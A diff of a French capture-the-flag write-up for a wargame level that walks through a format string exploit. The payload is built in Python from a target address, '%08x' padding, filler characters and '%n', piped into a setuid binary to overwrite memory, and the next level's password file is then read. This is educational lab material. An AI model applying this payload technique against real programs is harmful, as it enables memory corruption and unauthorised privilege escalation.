@@ -15,11 +15,13 @@ chaine à écrire : adresse + %02x.%02x.%02x.
 Enfin on écrit le %n :
 chaine à écrire : adresse + %02x.%02x.%02x.%n
 
+On veut 64 caracteres, donc 4 de xl'adresse + 24 des %08x + 36 caracteres = 64. On affiche 36 a pour augmenter artificiellement ce nombre
+
 On crée tout cela avec python :
-python -c "print '\x8c''\x98''\x04''\x08' + '%02x.'*3 + 'a' * 38 + '%n'" > /tmp/b
+python -c "print '\x8c''\x98''\x04''\x08' + '%08x'*3 + 'a' * 36 + '%n'"
 
 Puis on l'envoie avec cat et un pipe dans le programme via l'entree standard (stdin) :
-cat /tmp/b - | /home/user/level3/level3
+cat <(python -c "print '\x8c''\x98''\x04''\x08' + '%08x'*3 + 'a' * 36 + '%n'") - | ./level3
 
 On n'a plus qu'à récupérer le flag :
 cat /home/user/level4/.pass
